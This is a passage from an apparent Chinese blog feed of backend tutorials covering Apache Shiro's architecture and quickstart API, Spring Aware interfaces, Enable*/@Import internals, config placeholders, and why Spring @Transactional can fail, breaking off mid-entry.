。Shiro的crypto包包含量易于使用和理解的cryptographic Ciphers，Hasher（又名digests）以及不同的编码器实现的代表。所有在这个包中的类都被精心地设计以易于使用和易于理解。任何使用Java的本地密码支持的人都知道它可以是一个难以驯服的具有挑战性的动物。Shiro的cryptoAPI 简化了复杂的Java机制，并使加密对于普通人也易于使用。</p><ul><li><strong>Realms</strong>(org.apache.shiro.realm.Realm)</li></ul><p>如上所述，Realms在Shiro和你的应用程序的安全数据之间担当“桥梁”或“连接器”。当它实际上与安全相关的数据如用来执行身份验证（登录）及授权（访问控制）的用户帐户交互时，Shiro从一个或多个为应用程序配置的Realm中寻找许多这样的东西。你可以按你的需要配置多个Realm（通常一个数据源一个Realm），且Shiro将为身份验证和授权对它们进行必要的协调。</p><p><strong>The SecurityManager</strong></p><p>因为Shiro的API鼓励一个以Subject为中心的编程方式，大多数应用程序开发人员很少，如果真有，与SecurityManager直接进行交互（框架开发人员有时候会觉得它很有用）。即便如此，了解如何SecurityManager是如何工作的仍然是很重要的，尤其是在为应用程序配置一个SecurityManager的时候。</p><p><strong>Design</strong></p><p>如前所述，应用程序的SecurityManager执行安全操作并管理所有应用程序用户的状态。在Shiro的默认SecurityManager实现中，这包括：</p><ul><li><p>Authentication</p></li><li><p>Authorization</p></li><li><p>Session Management</p></li><li><p>Cache Management</p></li><li><p>Realm coordination</p></li><li><p>Event propagation</p></li><li><p>“Remember Me” Services</p></li><li><p>Subject creation</p></li><li><p>Logout</p></li></ul><p>以及更多。</p><p>但这是许多功能来尝试管理一个单一的组件。而且，使这些东西灵活而又可定制将会是非常困难的，如果一切都集<br>中到一个单一的实现类。</p><p>为了简化配置并启用灵活配置&#x2F;可插性，Shiro的实现都是高度模块化设计——由于如此的模块化，SecurityManager实现（以及它的类层次结构）并没有做很多事情。相反，SecurityManager 实现主要是作为一个轻量级的“容器”组<br>件，委托计划所有的行为到嵌套&#x2F;包裹的组件。这种“包装”的设计体现在上面的详细构架图。</p><p>虽然组件实际上执行逻辑，但SecurityManager实现知道何时以及如何协调组件来完成正确的行为。SecurityManager 实现和组件都是兼容JavaBean的，它允许你（或某个配置机制）通过标准的JavaBean的accessor&#x2F;mutator 方法（get*&#x2F;set*）轻松地自定义可拔插组件。这意味着 Shiro 的架构的组件性能够把自定义行为转化为非常容易的配置文件。</p><blockquote><p><strong>Easy Configuration</strong></p><p>由于JavaBeans的兼容性，通过任何支持JavaBean风格的配置的机制可以很容易的用自定义组件配置SecurityManager，如 Spring，Guice，JBoss，等等。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10 分钟快速上手 Shiro 新手教程</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Shrio/10%20%E5%88%86%E9%92%9F%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%20Shiro%20%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Shrio/10%20%E5%88%86%E9%92%9F%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%20Shiro%20%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="当前用户"><a href="#当前用户" class="headerlink" title="当前用户"></a>当前用户</h2><p>现在我们能够开始做一些我们真正关心的事情——执行安全操作。</p><p>当保护我们的应用程序时，我们对自己可能提出的最为相关的问题是“当前用户是谁”或“当前用户是否被允许做XXX”。</p><p>当我们编写代码或设计用户接口时，问这些问题是很常见的：应用程序通常是基于用户的背景情况建立的，且你想基于每个用户标准体现（保障）功能。因此，对于我们考虑应用程序安全的最自然的方式是基于当前用户。</p><p>Shiro的API使用它的Subject概念从根本上代表了“当前用户”的概念。</p><p>几乎在所有的环境中，你可以通过下面的调用获取当前正在执行的用户：</p><pre class="line-numbers language-none"><code class="language-none">Subject currentUser &#x3D; SecurityUtils.getSubject();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 SecurityUtils.getSubject()，我们可以获得当前正在执行的Subject。Subject是一个安全术语，它基本上的意思是“当前正在执行的用户的特定的安全视图”。它并没有被称为”User”是因为”User”一词通常和人类相关联。</p><p>在安全界，术语”Subject”可以表示为人类，而且可是第三方进程，cron job，daemonaccount，或其他类似的东西。它仅仅意味着“该事物目前正与软件交互”。</p><p>对于大多数的意图和目的，你可以把 Subject 看成是 Shiro 的”User”概念。</p><p>getSubject()在一个独立的应用程序中调用，可以返回一个在应用程序特定位置的基于用户数据的Subject，并且在服务器环境中（例如，Web 应用程序），它获取的Subject 是基于关联了当前线程或传入请求的用户数据的。</p><h2 id="当前用户会话"><a href="#当前用户会话" class="headerlink" title="当前用户会话"></a>当前用户会话</h2><p>现在你拥有了一个Subject，你能拿它来做什么？<br>如果你想在应用程序的当前会话中使事物对于用户可用，你可以获得他们的会话：</p><pre class="line-numbers language-none"><code class="language-none">Session session &#x3D; currentUser.getSession();session.setAttribute( &quot;someKey&quot;, &quot;aValue&quot; );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Session是一个Shiro的特定实例，它提供了大部分你经常与 HttpSessoins使用的东西，除了一些额外的好处以及一<br>个巨大的区别：它不需要一个 HTTP 环境！</p><p>如果在一个Web应用程序内部部署，默认的Session将会是基于 HttpSession 的。但在一个非 Web 环境中，像这<br>个简单的教程应用程序，Shiro将会默认自动地使用它的 Enterprise Session Management。这意味着你会使用相同的API在你的应用程序，在任何层，不论部署环境！这开辟了应用程序的新世界，由于任何需要会话的应用程序不必再被强制使用HttpSession或EJB Stateful Session Beans。并且，任何客户端技术现在能够共享会话数据。</p><p>因此，现在你能获取一个Subject以及他们的Session。如果他们被允许做某些事，如对角色和权限的检查，像“检查”真正有用的地方在哪呢？</p><h2 id="权限检查"><a href="#权限检查" class="headerlink" title="权限检查"></a>权限检查</h2><p>嗯，我们只能为一个已知的用户做这些检查。我们上面的 Subject实例代表了当前用户，但谁又是当前用户？呃，<br>他们是匿名的——也就是说，直到直到他们至少登录一次。那么，让我像下面这样做：</p><pre class="line-numbers language-none"><code class="language-none">if ( !currentUser.isAuthenticated() ) &#123;    &#x2F;&#x2F;collect user principals and credentials in a gui specific manner    &#x2F;&#x2F;such as username&#x2F;password html form, X509 certificate, OpenID, etc.    &#x2F;&#x2F;We&#39;ll use the username&#x2F;password example here since it is the most common.    &#x2F;&#x2F;(do you know what movie this is from? ;)    UsernamePasswordToken token &#x3D; new UsernamePasswordToken(&quot;lonestarr&quot;, &quot;vespa&quot;);    &#x2F;&#x2F;this is all you have to do to support &#39;remember me&#39; (no config - built in!):    token.setRememberMe(true);    currentUser.login(token);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这就是了！它再简单不过了。</p><p>但如果他们的登录尝试失败了会怎样？你能够捕获各种具体的异常来告诉你到底发生了什么，并允许你去处理并作<br>出相应反应：</p><pre class="line-numbers language-none"><code class="language-none">try &#123;    currentUser.login( token );    &#x2F;&#x2F;if no exception, that&#39;s it, we&#39;re done!&#125; catch ( UnknownAccountException uae ) &#123;    &#x2F;&#x2F;username wasn&#39;t in the system, show them an error message?&#125; catch ( IncorrectCredentialsException ice ) &#123;    &#x2F;&#x2F;password didn&#39;t match, try again?&#125; catch ( LockedAccountException lae ) &#123;    &#x2F;&#x2F;account for that username is locked - can&#39;t login.  Show them a message?&#125;    ... more types exceptions to check if you want ...&#125; catch ( AuthenticationException ae ) &#123;    &#x2F;&#x2F;unexpected condition - error?&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>你能够检查到许多不同类型的异常，或抛出你自己的自定义条件的异常——Shiro 可能不提供的。请参见<a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/authc/AuthenticationException.html">AuthenticationException JavaDoc</a> 获取更多。</p><blockquote><p><strong>Handy Hint</strong></p><p>最安全的做法是给普通的登录失败消息给用户，因为你当然不想帮助试图闯入你系统的攻击者。</p></blockquote><p>好了，到现在为止，我们已经有了一个登录用户。我们还能做些什么？</p><p>比方说，他们是是谁：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;print their identifying principal (in this case, a username): log.info( &quot;User [&quot; + currentUser.getPrincipal() + &quot;] logged in successfully.&quot; );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们也可以测试他们是否有特定的角色：</p><pre class="line-numbers language-none"><code class="language-none">if ( currentUser.hasRole( &quot;schwartz&quot; ) ) &#123;    log.info(&quot;May the Schwartz be with you!&quot; );&#125; else &#123;    log.info( &quot;Hello, mere mortal.&quot; );&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们还可以判断他们是否有权限在一个确定类型的实体上进行操作：</p><pre class="line-numbers language-none"><code class="language-none">if ( currentUser.isPermitted( &quot;lightsaber:weild&quot; ) ) &#123;    log.info(&quot;You may use a lightsaber ring.  Use it wisely.&quot;);&#125; else &#123;    log.info(&quot;Sorry, lightsaber rings are for schwartz masters only.&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然，我们可以执行极其强大的实例级权限检查——判断用户是否有能力访问某一类型的特定实例的能力：</p><pre class="line-numbers language-none"><code class="language-none">if ( currentUser.isPermitted( &quot;winnebago:drive:eagle5&quot; ) ) &#123;    log.info(&quot;You are permitted to &#39;drive&#39; the &#39;winnebago&#39; with license plate (id) &#39;eagle5&#39;.  &quot; +                &quot;Here are the keys - have fun!&quot;);&#125; else &#123;    log.info(&quot;Sorry, you aren&#39;t allowed to drive the &#39;eagle5&#39; winnebago!&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>小菜一碟，对吧？</p><p>最后，当用户完成了对应用程序的使用，他们可以注销：</p><pre class="line-numbers language-none"><code class="language-none">currentUser.logout(); &#x2F;&#x2F;removes all identifying information and invalidates their session too.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>希望此次推出的教程帮助您了解如何在一个基本的应用程序设置 Shiro 以及 Shiro 的主要设计理念。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Aware 容器感知技术</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/Spring%20Aware%20%E5%AE%B9%E5%99%A8%E6%84%9F%E7%9F%A5%E6%8A%80%E6%9C%AF/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/Spring%20Aware%20%E5%AE%B9%E5%99%A8%E6%84%9F%E7%9F%A5%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-Aware是什么"><a href="#Spring-Aware是什么" class="headerlink" title="Spring Aware是什么"></a>Spring Aware是什么</h2><p>Spring提供Aware接口能让Bean感知Spring容器的存在，即让Bean可以使用Spring容器所提供的资源。</p><h2 id="Spring-Aware的分类"><a href="#Spring-Aware的分类" class="headerlink" title="Spring Aware的分类"></a>Spring Aware的分类</h2><p>几种常用的Aware接口如下。</p><table><thead><tr><th>Aware接口</th><th>说明</th></tr></thead><tbody><tr><td>ApplicationContextAware</td><td>能获取Application Context调用容器的服务</td></tr><tr><td>ApplicationEventPublisherAware</td><td>应用事件发布器，可以用来发布事件</td></tr><tr><td>BeanClassLoaderAware</td><td>能获取加载当前Bean的类加载器</td></tr><tr><td>BeanFactoryAware</td><td>能获取Bean Factory调用容器的服务</td></tr><tr><td>BeanNameAware</td><td>能获取当前Bean的名称</td></tr><tr><td>EnvironmentAware</td><td>能获取当前容器的环境属性信息</td></tr><tr><td>MessageSourceAware</td><td>能获取国际化文本信息</td></tr><tr><td>ResourceLoaderAware</td><td>获取资源加载器读取资源文件</td></tr><tr><td>ServletConfigAware</td><td>能获取到ServletConfig</td></tr><tr><td>ServletContextAware</td><td>能获取到ServletContext</td></tr></tbody></table><p>更多的可以看它的继承图。</p><h2 id="Spring-Aware的使用"><a href="#Spring-Aware的使用" class="headerlink" title="Spring Aware的使用"></a>Spring Aware的使用</h2><p>如要获取容器中的某个Bean，可以继承ApplicationContextAware，让这个Bean拥有调用容器服务的能力。</p><pre class="line-numbers language-none"><code class="language-none">import org.springframework.beans.BeansException;import org.springframework.context.ApplicationContext;import org.springframework.context.ApplicationContextAware;public class SpringAppContext implements ApplicationContextAware &#123;private static ApplicationContext applicationContext &#x3D; null;@Overridepublic void setApplicationContext(ApplicationContext applicationContext) throws BeansException &#123;if (SpringAppContext.applicationContext &#x3D;&#x3D; null) &#123;SpringAppContext.applicationContext &#x3D; applicationContext;&#125;&#125;public static ApplicationContext getApplicationContext() &#123;return applicationContext;&#125;public static Object getBean(String name) &#123;return getApplicationContext().getBean(name);&#125;public static &lt;T&gt; T getBean(Class&lt;T&gt; clazz) &#123;return getApplicationContext().getBean(clazz);&#125;public static &lt;T&gt; T getBean(String name, Class&lt;T&gt; clazz) &#123;return getApplicationContext().getBean(name, clazz);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>欢迎大家转发到朋友圈，和朋友们一起提升自己。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Enable 高级应用及原理</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/Spring%20Enable%20%E9%AB%98%E7%BA%A7%E5%BA%94%E7%94%A8%E5%8F%8A%E5%8E%9F%E7%90%86/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/Spring%20Enable%20%E9%AB%98%E7%BA%A7%E5%BA%94%E7%94%A8%E5%8F%8A%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="Enable"><a href="#Enable" class="headerlink" title="Enable*"></a>Enable*</h2><p>之前的文章用到了一些Enable*开头的注解，比如EnableAsync、EnableScheduling、EnableAspectJAutoProxy、EnableCaching等，Enable表示开启&#x2F;允许一项功能。</p><h2 id="Enable-工作原理"><a href="#Enable-工作原理" class="headerlink" title="Enable*工作原理"></a>Enable*工作原理</h2><p>我们只需要几个很简单的注解就能开启一个复杂的功能，这是多么简易的用法，这是怎么办到的？</p><p>首先来看看计划任务@EnableScheduling的源代码</p><pre class="line-numbers language-none"><code class="language-none">@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Import(SchedulingConfiguration.class)@Documentedpublic @interface EnableScheduling &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要核心的配置就是导入了一个配置文件，所以谜底也就接开了。</p><p><code>@Import(SchedulingConfiguration.class)</code></p><h2 id="Import用法"><a href="#Import用法" class="headerlink" title="@Import用法"></a>@Import用法</h2><p>来看看Import的源码</p><pre class="line-numbers language-none"><code class="language-none">@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documentedpublic @interface Import &#123;&#x2F;** * &#123;@link Configuration&#125;, &#123;@link ImportSelector&#125;, &#123;@link ImportBeanDefinitionRegistrar&#125; * or regular component classes to import. *&#x2F;Class&lt;?&gt;[] value();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1、Configuration"><a href="#1、Configuration" class="headerlink" title="1、Configuration"></a>1、Configuration</h3><p>即上面的用法，直接导入Configuration配置类。</p><h3 id="2、ImportSelector"><a href="#2、ImportSelector" class="headerlink" title="2、ImportSelector"></a>2、ImportSelector</h3><p>根据条件选择导入不同的配置类，参考@EnableAsync</p><pre class="line-numbers language-none"><code class="language-none">@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documented@Import(AsyncConfigurationSelector.class)public @interface EnableAsync &#123;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">public class AsyncConfigurationSelector extends AdviceModeImportSelector&lt;EnableAsync&gt; &#123;private static final String ASYNC_EXECUTION_ASPECT_CONFIGURATION_CLASS_NAME &#x3D;&quot;org.springframework.scheduling.aspectj.AspectJAsyncConfiguration&quot;;&#x2F;** * &#123;@inheritDoc&#125; * @return &#123;@link ProxyAsyncConfiguration&#125; or &#123;@code AspectJAsyncConfiguration&#125; for * &#123;@code PROXY&#125; and &#123;@code ASPECTJ&#125; values of &#123;@link EnableAsync#mode()&#125;, respectively *&#x2F;@Overridepublic String[] selectImports(AdviceMode adviceMode) &#123;switch (adviceMode) &#123;case PROXY:return new String[] &#123; ProxyAsyncConfiguration.class.getName() &#125;;case ASPECTJ:return new String[] &#123; ASYNC_EXECUTION_ASPECT_CONFIGURATION_CLASS_NAME &#125;;default:return null;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、ImportBeanDefinitionRegistrar"><a href="#3、ImportBeanDefinitionRegistrar" class="headerlink" title="3、ImportBeanDefinitionRegistrar"></a>3、ImportBeanDefinitionRegistrar</h3><p>动态注册Bean，参考@EnableAspectJAutoProxy</p><pre class="line-numbers language-none"><code class="language-none">@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documented@Import(AspectJAutoProxyRegistrar.class)public @interface EnableAspectJAutoProxy &#123;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">class AspectJAutoProxyRegistrar implements ImportBeanDefinitionRegistrar &#123;&#x2F;** * Register, escalate, and configure the AspectJ auto proxy creator based on the value * of the @&#123;@link EnableAspectJAutoProxy#proxyTargetClass()&#125; attribute on the importing * &#123;@code @Configuration&#125; class. *&#x2F;@Overridepublic void registerBeanDefinitions(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry) &#123;AopConfigUtils.registerAspectJAnnotationAutoProxyCreatorIfNecessary(registry);AnnotationAttributes enableAspectJAutoProxy &#x3D;AnnotationConfigUtils.attributesFor(importingClassMetadata, EnableAspectJAutoProxy.class);if (enableAspectJAutoProxy.getBoolean(&quot;proxyTargetClass&quot;)) &#123;AopConfigUtils.forceAutoProxyCreatorToUseClassProxying(registry);&#125;if (enableAspectJAutoProxy.getBoolean(&quot;exposeProxy&quot;)) &#123;AopConfigUtils.forceAutoProxyCreatorToExposeProxy(registry);&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring import 配置文件使用占位符</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/Spring%20import%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BD%BF%E7%94%A8%E5%8D%A0%E4%BD%8D%E7%AC%A6/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/Spring%20import%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BD%BF%E7%94%A8%E5%8D%A0%E4%BD%8D%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="import使用占位符"><a href="#import使用占位符" class="headerlink" title="import使用占位符"></a>import使用占位符</h2><p>连接池切换导入配置的代码：</p><pre class="line-numbers language-none"><code class="language-none">&lt;import resource&#x3D;&quot;classpath:META-INF&#x2F;spring&#x2F;spring-$&#123;db.connection.pool&#125;.xml&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在配置文件添加配置</p><pre class="line-numbers language-none"><code class="language-none">db.connection.pool&#x3D;druid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动直接报错，读取不到配置，因为属性文件的加载在import配置文件之后。</p><pre class="line-numbers language-none"><code class="language-none">Caused by: java.lang.IllegalArgumentException: Could not resolve placeholder &#39;db.connection.pool&#39; in value &quot;classpath:META-INF&#x2F;spring&#x2F;spring-$&#123;db.connection.pool&#125;.xml&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以，要在应用启动的时候添加属性</p><p>1、添加AppContextInitializer启动类：</p><pre class="line-numbers language-none"><code class="language-none">public class AppContextInitializerimplements ApplicationContextInitializer&lt;ConfigurableApplicationContext&gt; &#123;private Logger logger &#x3D; Logger.getLogger(AppContextInitializer.class);@Overridepublic void initialize(ConfigurableApplicationContext applicationContext) &#123;ResourcePropertySource propertySource &#x3D; null;try &#123;propertySource &#x3D; new ResourcePropertySource(&quot;classpath:config&#x2F;db-config.properties&quot;);&#125; catch (IOException e) &#123;logger.error(&quot;加载配置文件[config&#x2F;db-config.properties]失败&quot;);&#125;applicationContext.getEnvironment().getPropertySources().addFirst(propertySource);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、在web.xml中添加配置：</p><pre class="line-numbers language-none"><code class="language-none">context-param&gt;      &lt;param-name&gt;contextInitializerClasses&lt;&#x2F;param-name&gt;      &lt;param-value&gt;com.example.AppContextInitializer&lt;&#x2F;param-value&gt;  &lt;&#x2F;context-param&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>启动配置文件加载正常。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring 事务失效的 8 大原因，这次可以吊打面试官了</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/Spring%20%E4%BA%8B%E5%8A%A1%E5%A4%B1%E6%95%88%E7%9A%84%208%20%E5%A4%A7%E5%8E%9F%E5%9B%A0%EF%BC%8C%E8%BF%99%E6%AC%A1%E5%8F%AF%E4%BB%A5%E5%90%8A%E6%89%93%E9%9D%A2%E8%AF%95%E5%AE%98%E4%BA%86/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring/Spring%20%E4%BA%8B%E5%8A%A1%E5%A4%B1%E6%95%88%E7%9A%84%208%20%E5%A4%A7%E5%8E%9F%E5%9B%A0%EF%BC%8C%E8%BF%99%E6%AC%A1%E5%8F%AF%E4%BB%A5%E5%90%8A%E6%89%93%E9%9D%A2%E8%AF%95%E5%AE%98%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<p>今天再来一篇《<strong>吊打面试官</strong>》系列，这次真的要吊打了，哈哈！（看往期吊打系列请在后台回复：<strong>吊打</strong>，我会陆续更新……）</p><p>前几天栈长不是发了一篇文章，里面有一个关于事务失效的问题：</p><blockquote><p>用 Spring 的 <code>@Transactional</code> 注解控制事务有哪些不生效的场景？</p></blockquote><p>其中有个热心粉丝留言分享了下，我觉得总结得有点经验，给置顶了：</p><p>但是我觉得还是总结得不够全，今天栈长我再总结一下，再延着这位粉丝的总结再补充完善一下，不用说，我肯定也不见得总结全，但希望可以帮忙有需要的人。</p><h4 id="1、数据库引擎不支持事务"><a href="#1、数据库引擎不支持事务" class="headerlink" title="1、数据库引擎不支持事务"></a>1、数据库引擎不支持事务</h4><p>这里以 MySQL 为例，其 MyISAM 引擎是不支持事务操作的，InnoDB 才是支持事务的引擎，一般要支持事务都会使用 InnoDB。</p><p>根据 MySQL 的官方文档：</p><blockquote><p><a href="https://dev.mysql.com/doc/refman/5.5/en/storage-engine-setting.html">https://dev.mysql.com/doc/refman/5.5/en/storage-engine-setting.html</a></p></blockquote><p>从 MySQL 5.5.5 开始的默认存储引擎是：InnoDB，之前默认的都是：MyISAM，所以这点要值得注意，底层引擎不支持事务再怎么搞都是白搭。</p><h4 id="2、没有被-Spring-管理"><a href="#2、没有被-Spring-管理" class="headerlink" title="2、没有被 Spring 管理"></a>2、没有被 Spring 管理</h4><p>如下面例子所示：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; @Servicepublic class OrderServiceImpl implements OrderService &#123;    @Transactional    public void updateOrder(Order order) &#123;        &#x2F;&#x2F; update order    &#125;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果此时把 <code>@Service</code> 注解注释掉，这个类就不会被加载成一个 Bean，那这个类就不会被 Spring 管理了，事务自然就失效了。</p><h4 id="3、方法不是-public-的"><a href="#3、方法不是-public-的" class="headerlink" title="3、方法不是 public 的"></a>3、方法不是 public 的</h4><p>以下来自 Spring 官方文档：</p><blockquote><p>When using proxies, you should apply the @Transactional annotation only to methods with public visibility. If you do annotate protected, private or package-visible methods with the @Transactional annotation, no error is raised, but the annotated method does not exhibit the configured transactional settings. Consider the use of AspectJ (see below) if you need to annotate non-public methods.</p></blockquote><p>大概意思就是 <code>@Transactional</code> 只能用于 public 的方法上，否则事务不会失效，如果要用在非 public 方法上，可以开启 <code>AspectJ</code> 代理模式。</p><h4 id="4、自身调用问题"><a href="#4、自身调用问题" class="headerlink" title="4、自身调用问题"></a>4、自身调用问题</h4><p>来看两个示例：</p><pre class="line-numbers language-none"><code class="language-none">@Servicepublic class OrderServiceImpl implements OrderService &#123;    public void update(Order order) &#123;        updateOrder(order);    &#125;        @Transactional    public void updateOrder(Order order) &#123;        &#x2F;&#x2F; update order    &#125;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>update方法上面没有加 <code>@Transactional</code> 注解，调用有 <code>@Transactional</code> 注解的 updateOrder 方法，updateOrder 方法上的事务管用吗？</p><p>再来看下面这个例子：</p><pre class="line-numbers language-none"><code class="language-none">@Servicepublic class OrderServiceImpl implements OrderService &#123;    @Transactional    public void update(Order order) &#123;        updateOrder(order);    &#125;        @Transactional(propagation &#x3D; Propagation.REQUIRES_NEW)    public void updateOrder(Order order) &#123;        &#x2F;&#x2F; update order    &#125;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次在 update 方法上加了 <code>@Transactional</code>，updateOrder 加了 <code>REQUIRES_NEW</code> 新开启一个事务，那么新开的事务管用么？</p><p>这两个例子的答案是：不管用！</p><p>因为它们发生了自身调用，就调该类自己的方法，而没有经过 Spring 的代理类，默认只有在外部调用事务才会生效，这也是老生常谈的经典问题了。</p><p>这个的解决方案之一就是在的类中注入自己，用注入的对象再调用另外一个方法，这个不太优雅，另外一个可行的方案可以参考《<a href="https://mp.weixin.qq.com/s/1TEBnmWynN4nwc6Q-oZfvw">Spring 如何在一个事务中开启另一个事务？</a>》这篇文章。</p><h4 id="5、数据源没有配置事务管理器"><a href="#5、数据源没有配置事务管理器" class="headerlink" title="5、数据源没有配置事务管理器"></a>5、数据源没有配置事务管理器</h4><pre class="line-numbers language-none"><code class="language-none">@Beanpublic PlatformTransactionManager transactionManager(DataSource dataSource) &#123;    return new DataSourceTransactionManager(dataSource);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如上面所示，当前数据源若没有配置事务管理器，那也是白搭！</p><h4 id="6、不支持事务"><a href="#6、不支持事务" class="headerlink" title="6、不支持事务"></a>6、不支持事务</h4><p>来看下面这个例子：</p><pre class="line-numbers language-none"><code class="language-none">@Servicepublic class OrderServiceImpl implements OrderService &#123;    @Transactional    public void update(Order order) &#123;        updateOrder(order);    &#125;        @Transactional(propagation &#x3D; Propagation.NOT_SUPPORTED)    public void updateOrder(Order order) &#123;        &#x2F;&#x2F; update order    &#125;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Propagation.NOT_SUPPORTED：</strong> 表示不以事务运行，当前若存在事务则挂起，详细的可以参考《<a 